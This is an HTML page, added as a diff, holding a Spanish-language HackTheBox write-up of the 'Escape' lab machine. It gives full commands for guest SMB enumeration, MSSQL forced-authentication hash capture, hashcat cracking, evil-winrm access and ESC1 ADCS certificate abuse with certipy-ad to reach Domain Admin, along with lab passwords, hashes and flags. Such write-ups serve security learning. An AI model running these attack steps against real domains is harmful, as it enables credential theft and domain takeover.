@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Escape HTB — ESC1 ADCS | OJM.SEC</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #f7f6f2; --surface: #ffffff; --border: #e2e0d8;
+  --text: #1a1917; --muted: #7a7870; --accent: #c8441b; --accent2: #1b5ec8;
+  --tag-bg: #f0ede4; --mono: 'JetBrains Mono', monospace; --sans: 'Syne', sans-serif;
+}
+html { scroll-behavior: smooth; }
+body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; }
+nav {
+  position: sticky; top: 0; z-index: 100; background: var(--bg);
+  border-bottom: 1px solid var(--border); padding: 0 2rem;
+  display: flex; align-items: center; justify-content: space-between; height: 56px;
+}
+.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; text-decoration: none; color: var(--text); }
+.nav-logo span { color: var(--accent); }
+.nav-links { display: flex; gap: 2rem; align-items: center; }
+.nav-links a { font-family: var(--mono); font-size: 0.75rem; color: var(--muted); text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s; }
+.nav-links a:hover { color: var(--text); }
+.nav-writeup-nav { display: flex; gap: 0.5rem; }
+.nav-btn { font-family: var(--mono); font-size: 0.68rem; padding: 0.3rem 0.8rem; border: 1px solid var(--border); background: none; color: var(--muted); cursor: pointer; text-decoration: none; letter-spacing: 0.04em; transition: all 0.15s; display: flex; align-items: center; gap: 0.3rem; }
+.nav-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-btn.prev { background: var(--tag-bg); }
+.writeup-hero { max-width: 1100px; margin: 0 auto; padding: 4rem 2rem 3rem; border-bottom: 1px solid var(--border); }
+.hero-meta { display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.5rem; }
+.platform-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; border: 1px solid var(--border); color: var(--muted); }
+.platform-badge.htb { border-color: #9fef00; color: #5a8a00; background: #f6fff0; }
+.difficulty-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; background: var(--tag-bg); color: var(--muted); }
+.writeup-hero h1 { font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 0.6rem; }
+.writeup-hero .subtitle { font-family: var(--mono); font-size: 0.82rem; color: var(--muted); margin-bottom: 1.5rem; }
+.hero-stats { display: flex; gap: 2rem; flex-wrap: wrap; padding-top: 1.5rem; border-top: 1px solid var(--border); }
+.stat { display: flex; flex-direction: column; gap: 0.2rem; }
+.stat-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); }
+.stat-value { font-family: var(--mono); font-size: 0.82rem; font-weight: 500; color: var(--text); }
+.writeup-layout { max-width: 1100px; margin: 0 auto; padding: 3rem 2rem 6rem; display: grid; grid-template-columns: 220px 1fr; gap: 3rem; }
+@media (max-width: 768px) { .writeup-layout { grid-template-columns: 1fr; } .sidebar { display: none; } }
+.sidebar { position: sticky; top: 76px; align-self: start; }
+.sidebar-title { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+.sidebar-nav { display: flex; flex-direction: column; gap: 0.1rem; }
+.sidebar-link { font-family: var(--mono); font-size: 0.68rem; color: var(--muted); text-decoration: none; padding: 0.35rem 0.7rem; border-left: 2px solid transparent; transition: all 0.15s; letter-spacing: 0.02em; }
+.sidebar-link:hover { color: var(--text); border-left-color: var(--accent); background: var(--tag-bg); }
+.sidebar-link.active { color: var(--accent); border-left-color: var(--accent); }
+.writeup-content { min-width: 0; }
+.section { margin-bottom: 3.5rem; padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); }
+.section:last-child { border-bottom: none; }
+.section-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent); margin-bottom: 0.5rem; }
+.section h2 { font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em; margin-bottom: 1.2rem; line-height: 1.2; }
+.section h3 { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin: 1.8rem 0 0.7rem; }
+.section p { font-family: var(--mono); font-size: 0.78rem; line-height: 1.9; color: #3d3b36; margin-bottom: 0.8rem; }
+.section ul { list-style: none; padding: 0; margin-bottom: 1rem; }
+.section ul li { font-family: var(--mono); font-size: 0.76rem; line-height: 1.8; color: #3d3b36; padding-left: 1.2rem; position: relative; margin-bottom: 0.2rem; }
+.section ul li::before { content: '→'; position: absolute; left: 0; color: var(--accent); font-size: 0.65rem; top: 0.05rem; }
+.attack-step { margin-bottom: 2.5rem; padding: 1.5rem 1.8rem; border: 1px solid var(--border); background: var(--surface); position: relative; }
+.attack-step::before { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--accent); }
+.step-num { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; color: var(--accent); text-transform: uppercase; margin-bottom: 0.4rem; }
+.step-title { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin-bottom: 1rem; line-height: 1.3; }
+.step-desc { font-family: var(--mono); font-size: 0.76rem; color: #3d3b36; line-height: 1.9; margin-bottom: 0.9rem; }
+.step-h3 { font-family: var(--sans); font-size: 0.88rem; font-weight: 700; margin: 1.4rem 0 0.6rem; color: var(--text); }
+pre { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; overflow-x: auto; line-height: 1.8; border-left: 3px solid var(--accent); }
+code { font-family: var(--mono); font-size: 0.78em; background: var(--tag-bg); padding: 0.1em 0.35em; border-radius: 2px; }
+.cmd-comment { color: #6b7280; }
+.cmd-flag { color: #60a5fa; }
+.cmd-value { color: #34d399; }
+.cmd-tool { color: #f87171; }
+.callout { background: var(--tag-bg); border-left: 3px solid var(--accent2); padding: 1rem 1.2rem; margin: 1rem 0; font-family: var(--mono); font-size: 0.74rem; line-height: 1.8; color: #3d3b36; }
+.callout strong { color: var(--accent2); }
+.callout-warn { border-left-color: var(--accent); }
+.callout-warn strong { color: var(--accent); }
+.findings-table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-family: var(--mono); font-size: 0.72rem; }
+.findings-table th { text-align: left; padding: 0.6rem 0.8rem; background: var(--tag-bg); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); border-bottom: 2px solid var(--border); }
+.findings-table td { padding: 0.7rem 0.8rem; border-bottom: 1px solid var(--border); color: #3d3b36; vertical-align: top; }
+.findings-table tr:hover td { background: var(--tag-bg); }
+.severity { display: inline-block; font-size: 0.6rem; letter-spacing: 0.08em; padding: 0.15rem 0.5rem; font-weight: 600; }
+.sev-critical { background: #fee2e2; color: #7f1d1d; }
+.sev-high { background: #fee2e2; color: #991b1b; }
+.sev-medium { background: #fef3c7; color: #92400e; }
+.sev-info { background: #e0f2fe; color: #0c4a6e; }
+.tag-row { display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 1rem; }
+.tag { font-family: var(--mono); font-size: 0.6rem; padding: 0.18rem 0.5rem; border: 1px solid var(--border); color: var(--muted); letter-spacing: 0.04em; }
+.creds-box { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; border-left: 3px solid #34d399; line-height: 2; }
+.cred-label { color: #6b7280; }
+.cred-user { color: #60a5fa; }
+.cred-pass { color: #34d399; }
+.writeup-nav-bottom { display: flex; justify-content: space-between; align-items: center; padding-top: 2rem; margin-top: 2rem; border-top: 1px solid var(--border); }
+.nav-link-btn { font-family: var(--mono); font-size: 0.72rem; color: var(--muted); text-decoration: none; padding: 0.6rem 1rem; border: 1px solid var(--border); display: flex; align-items: center; gap: 0.5rem; transition: all 0.15s; }
+.nav-link-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-link-btn.prev-page { background: var(--tag-bg); }
+footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; font-family: var(--mono); font-size: 0.68rem; color: var(--muted); letter-spacing: 0.06em; }
+</style>
+</head>
+<body>
+<nav>
+  <a class="nav-logo" href="index.html">OJM<span>.</span>SEC</a>
+  <div class="nav-links">
+    <a href="index.html">&larr; Volver</a>
+    <div class="nav-writeup-nav">
+      <a class="nav-btn prev" href="busqueda.html">&larr; Búsqueda</a>
+      <a class="nav-btn" href="index.html#writeups">Todos</a>
+      <a class="nav-btn next" href="active.html">Active &rarr;</a>
+    </div>
+  </div>
+</nav>
+<div class="writeup-hero">
+  <div class="hero-meta">
+    <span class="platform-badge htb">HackTheBox</span>
+    <span class="difficulty-badge">Active Directory</span>
+    <span class="difficulty-badge">Windows Server 2019</span>
+    <span class="difficulty-badge">18 Jun 2026</span>
+  </div>
+  <h1>Escape</h1>
+  <p class="subtitle">sequel.htb &mdash; Domain Admin via SMB guest &rarr; MSSQL NTLMv2 &rarr; ERRORLOG creds &rarr; ESC1 ADCS</p>
+  <div class="hero-stats">
+    <div class="stat"><span class="stat-label">Target IP</span><span class="stat-value">10.129.17.228</span></div>
+    <div class="stat"><span class="stat-label">Domain</span><span class="stat-value">sequel.htb</span></div>
+    <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Windows Server 2019</span></div>
+    <div class="stat"><span class="stat-label">Findings</span><span class="stat-value">5 (1 Critical, 3 High, 1 Med)</span></div>
+    <div class="stat"><span class="stat-label">Resultado</span><span class="stat-value">Domain Admin</span></div>
+    <div class="stat"><span class="stat-label">Autor</span><span class="stat-value">Oriol Jaen Mirabet</span></div>
+  </div>
+</div>
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-title">Contenido</div>
+    <nav class="sidebar-nav">
+      <a class="sidebar-link" href="#resumen">Resumen ejecutivo</a>
+      <a class="sidebar-link" href="#nmap">01 &middot; Nmap</a>
+      <a class="sidebar-link" href="#smb">02 &middot; SMB guest</a>
+      <a class="sidebar-link" href="#mssql">03 &middot; MSSQL NTLMv2</a>
+      <a class="sidebar-link" href="#winrm">04 &middot; WinRM sql_svc</a>
+      <a class="sidebar-link" href="#lateral">05 &middot; Ryan.Cooper</a>
+      <a class="sidebar-link" href="#adcs">06 &middot; ESC1 ADCS</a>
+      <a class="sidebar-link" href="#findings">Findings</a>
+      <a class="sidebar-link" href="#creds">Credenciales</a>
+    </nav>
+  </aside>
+  <main class="writeup-content">
+    <section class="section" id="resumen">
+      <div class="section-label">00 &mdash; Overview</div>
+      <h2>Resumen Ejecutivo</h2>
+      <p>Escape es un DC Windows Server 2019 que encadena exposición de información en SMB, captura de credenciales MSSQL y una misconfiguration crítica de ADCS (ESC1). Punto de entrada por guest, escalada final a Domain Admin mediante un certificado malicioso.</p>
+      <div class="callout"><strong>Attack Path</strong><br>SMB guest &rarr; PDF con creds MSSQL &rarr; xp_dirtree NTLMv2 sql_svc &rarr; hashcat &rarr; WinRM &rarr; ERRORLOG.BAK &rarr; Ryan.Cooper &rarr; certipy-ad ESC1 &rarr; Administrator hash &rarr; Domain Admin</div>
+    </section>
+    <section class="section" id="nmap">
+      <div class="section-label">01 &mdash; Recon</div>
+      <h2>Nmap &mdash; DC con MSSQL 1433 y WinRM 5985</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 01</div>
+        <div class="step-title">Domain Controller confirmado &mdash; MSSQL + WinRM abren la superficie</div>
+        <p class="step-desc">Perfil de puertos clásico de DC: 53, 88, 389, 445, 636, 3268. Destacan MSSQL en 1433 (vector de captura NTLMv2) y WinRM en 5985 (acceso post-credenciales). El banner NTLM del servicio MSSQL filtra el dominio.</p>
+        <pre><span class="cmd-comment"># Banner NTLM via nmap script ms-sql-ntlm-info</span>
+DNS_Domain_Name: sequel.htb
+Product_Version: 10.0.17763 <span class="cmd-comment"># Windows Server 2019</span></pre>
+      </div>
+    </section>
+    <section class="section" id="smb">
+      <div class="section-label">02 &mdash; SMB</div>
+      <h2>SMB guest &mdash; PDF con credenciales en share p&uacute;blico</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 02</div>
+        <div class="step-title">Share Public accesible con guest &rarr; SQL Server Procedures.pdf</div>
+        <p class="step-desc">El share Public no requiere credenciales v&aacute;lidas. Contiene un PDF de onboarding que incluye credenciales de acceso MSSQL para usuarios nuevos: <code>PublicUser / GuestUserCantWrite1</code>. Tambi&eacute;n se enumeran usuarios del dominio via RID brute-force.</p>
+        <pre><span class="cmd-tool">nxc</span> smb 10.129.17.228 <span class="cmd-flag">-u</span> guest <span class="cmd-flag">-p</span> '' --shares
+<span class="cmd-value">Public   READ</span>
+
+<span class="cmd-tool">smbclient</span> //10.129.17.228/Public <span class="cmd-flag">-U</span> guest -N -c 'mget *'
+<span class="cmd-comment"># PDF revela: PublicUser / GuestUserCantWrite1</span>
+
+<span class="cmd-tool">nxc</span> smb 10.129.17.228 <span class="cmd-flag">-u</span> guest <span class="cmd-flag">-p</span> '' --rid-brute 3000 | grep SidTypeUser
+<span class="cmd-value">sql_svc / Ryan.Cooper / Tom.Henn / Brandon.Brown / James.Roberts</span></pre>
+      </div>
+    </section>
+    <section class="section" id="mssql">
+      <div class="section-label">03 &mdash; MSSQL</div>
+      <h2>MSSQL &mdash; Forced auth via xp_dirtree &rarr; NTLMv2 de sql_svc</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 03</div>
+        <div class="step-title">PublicUser en MSSQL &rarr; captura NTLMv2 &rarr; hashcat &rarr; REGGIE1234ronnie</div>
+        <p class="step-desc">Autenticados en MSSQL como PublicUser, forzamos una conexi&oacute;n SMB de vuelta hacia nuestra m&aacute;quina usando xp_dirtree o el m&oacute;dulo de nxc. El servidor MSSQL intenta autenticarse con la cuenta de servicio sql_svc, entregando su hash NTLMv2. Hascat con -m 5600 lo crackea r&aacute;pidamente.</p>
+        <pre><span class="cmd-tool">nxc</span> mssql 10.129.17.228 <span class="cmd-flag">-u</span> PublicUser <span class="cmd-flag">-p</span> GuestUserCantWrite1 --local-auth
+<span class="cmd-value">[+] DC\PublicUser:GuestUserCantWrite1</span>
+
+<span class="cmd-comment"># Forced auth &rarr; NTLMv2 capturado</span>
+SQL_SVC::sequel:...: [hash NTLMv2]
+
+<span class="cmd-tool">hashcat</span> <span class="cmd-flag">-m</span> 5600 sql_svc_hash.txt /usr/share/wordlists/rockyou.txt
+SQL_SVC::sequel:...: <span class="cmd-value">REGGIE1234ronnie</span></pre>
+      </div>
+    </section>
+    <section class="section" id="winrm">
+      <div class="section-label">04 &mdash; WinRM</div>
+      <h2>Shell como sql_svc v&iacute;a WinRM</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 04</div>
+        <div class="step-title">sql_svc:REGGIE1234ronnie &rarr; evil-winrm &rarr; shell inicial</div>
+        <p class="step-desc">La contrase&ntilde;a crackeada da acceso WinRM. Desde la shell enumeramos directorios de SQL Server en busca de logs y configuraciones.</p>
+        <pre><span class="cmd-tool">nxc</span> winrm 10.129.17.228 <span class="cmd-flag">-u</span> sql_svc <span class="cmd-flag">-p</span> REGGIE1234ronnie
+<span class="cmd-value">[+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)</span>
+
+<span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.129.17.228 <span class="cmd-flag">-u</span> sql_svc <span class="cmd-flag">-p</span> REGGIE1234ronnie</pre>
+      </div>
+    </section>
+    <section class="section" id="lateral">
+      <div class="section-label">05 &mdash; Lateral Movement</div>
+      <h2>ERRORLOG.BAK &mdash; Contrase&ntilde;a de Ryan.Cooper en texto claro</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 05</div>
+        <div class="step-title">Log de SQL Server filtra credenciales en campo de usuario err&oacute;neo</div>
+        <p class="step-desc">En <code>C:\SQLServer\Logs\ERRORLOG.BAK</code> hay un login fallido donde el usuario escribi&oacute; su contrase&ntilde;a en el campo username. Un patr&oacute;n muy frecuente en auditor&iacute;as reales: los logs de aplicaci&oacute;n quedan como fuente de credenciales inadvertidas.</p>
+        <pre>*Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK
+
+Logon failed for user 'sequel.htb\Ryan.Cooper'
+Logon failed for user '<span class="cmd-value">NuclearMosquito3</span>' <span class="cmd-comment"># contrase&ntilde;a tipada como username</span>
+
+<span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.129.17.228 <span class="cmd-flag">-u</span> Ryan.Cooper <span class="cmd-flag">-p</span> NuclearMosquito3
+<span class="cmd-value">user.txt: 33d63cd3ab0adbe33b7182974d3b2be8</span></pre>
+      </div>
+    </section>
+    <section class="section" id="adcs">
+      <div class="section-label">06 &mdash; PrivEsc</div>
+      <h2>ESC1 ADCS &mdash; Certificado malicioso &rarr; hash Administrator</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 06</div>
+        <div class="step-title">certipy-ad detecta ESC1 en UserAuthentication &rarr; impersonar Administrator</div>
+        <p class="step-desc">El template <code>UserAuthentication</code> tiene <code>EnrolleeSuppliesSubject</code> activo y permite autenticaci&oacute;n de cliente. Cualquier usuario del dominio puede pedir un certificado con el UPN de administrator. Con ese certificado, Certipy recupera el hash NTLM del Administrator mediante autenticaci&oacute;n PKINIT.</p>
+        <pre><span class="cmd-tool">certipy-ad</span> find <span class="cmd-flag">-dc-ip</span> 10.129.17.228 <span class="cmd-flag">-u</span> Ryan.Cooper <span class="cmd-flag">-p</span> NuclearMosquito3 <span class="cmd-flag">-vulnerable</span> -stdout
+<span class="cmd-value">[!] ESC1: UserAuthentication &mdash; EnrolleeSuppliesSubject + Client Auth</span>
+
+<span class="cmd-tool">certipy-ad</span> req <span class="cmd-flag">-dc-ip</span> 10.129.17.228 <span class="cmd-flag">-u</span> Ryan.Cooper <span class="cmd-flag">-p</span> NuclearMosquito3 <span class="cmd-flag">-ca</span> sequel-DC-CA <span class="cmd-flag">-template</span> UserAuthentication <span class="cmd-flag">-upn</span> administrator@sequel.htb
+<span class="cmd-value">[+] Wrote certificate to administrator.pfx</span>
+
+<span class="cmd-tool">certipy-ad</span> auth <span class="cmd-flag">-pfx</span> administrator.pfx <span class="cmd-flag">-username</span> administrator <span class="cmd-flag">-domain</span> sequel.htb <span class="cmd-flag">-dc-ip</span> 10.129.17.228
+<span class="cmd-value">NT hash: a52f78e4c751e5f5e17e1e9f3e58f4ee</span>
+
+<span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.129.17.228 <span class="cmd-flag">-u</span> Administrator <span class="cmd-flag">-H</span> a52f78e4c751e5f5e17e1e9f3e58f4ee
+<span class="cmd-value">root.txt: 68dda7ddebe4f3da4521d397d8117cf8</span></pre>
+      </div>
+    </section>
+    <section class="section" id="findings">
+      <div class="section-label">07 &mdash; Findings</div>
+      <h2>Tabla de Hallazgos</h2>
+      <table class="findings-table">
+        <thead><tr><th>Severity</th><th>Finding</th><th>Descripci&oacute;n</th><th>CVSS</th></tr></thead>
+        <tbody>
+          <tr><td><span class="severity sev-critical">Critical</span></td><td>ESC1 &mdash; ADCS Template Misconfiguration</td><td>EnrolleeSuppliesSubject permite impersonar cualquier cuenta del dominio con un certificado.</td><td>9.0</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>MSSQL NTLMv2 Forced Authentication</td><td>xp_dirtree fuerza autenticaci&oacute;n NTLM exponiendo hash NTLMv2 del service account.</td><td>7.5</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>Credenciales en SMB p&uacute;blico</td><td>PDF con creds MSSQL accesible sin autenticaci&oacute;n.</td><td>7.3</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>Contrase&ntilde;a en logs SQL Server</td><td>ERRORLOG.BAK expone la contrase&ntilde;a de Ryan.Cooper como username en login fallido.</td><td>7.1</td></tr>
+          <tr><td><span class="severity sev-medium">Medium</span></td><td>Contrase&ntilde;a d&eacute;bil sql_svc</td><td>REGGIE1234ronnie crackeada con rockyou.txt en hashcat -m 5600.</td><td>5.3</td></tr>
+        </tbody>
+      </table>
+      <div class="tag-row"><span class="tag">ADCS ESC1</span><span class="tag">certipy-ad</span><span class="tag">MSSQL NTLMv2</span><span class="tag">SMB Anon</span><span class="tag">hashcat</span><span class="tag">Log Disclosure</span></div>
+    </section>
+    <section class="section" id="creds">
+      <div class="section-label">08 &mdash; Credentials</div>
+      <h2>Credenciales Obtenidas</h2>
+      <div class="creds-box"><span class="cred-label"># MSSQL (PDF)</span>
+<span class="cred-user">PublicUser</span>:<span class="cred-pass">GuestUserCantWrite1</span>
+<span class="cred-label"># sql_svc (NTLMv2 cracked)</span>
+<span class="cred-user">sql_svc</span>:<span class="cred-pass">REGGIE1234ronnie</span>
+<span class="cred-label"># domain user (ERRORLOG.BAK)</span>
+<span class="cred-user">Ryan.Cooper</span>:<span class="cred-pass">NuclearMosquito3</span>
+<span class="cred-label"># Administrator NTLM (ESC1)</span>
+<span class="cred-user">Administrator</span>:<span class="cred-pass">a52f78e4c751e5f5e17e1e9f3e58f4ee [NTLM]</span></div>
+      <div class="callout"><strong>Flags</strong><br>user.txt: 33d63cd3ab0adbe33b7182974d3b2be8<br>root.txt: 68dda7ddebe4f3da4521d397d8117cf8</div>
+    </section>
+  </main>
+</div>
+<footer>OJM.SEC &middot; Oriol Jaen Mirabet &middot; Security Research &amp; Writeups</footer>
+</body>
+</html>
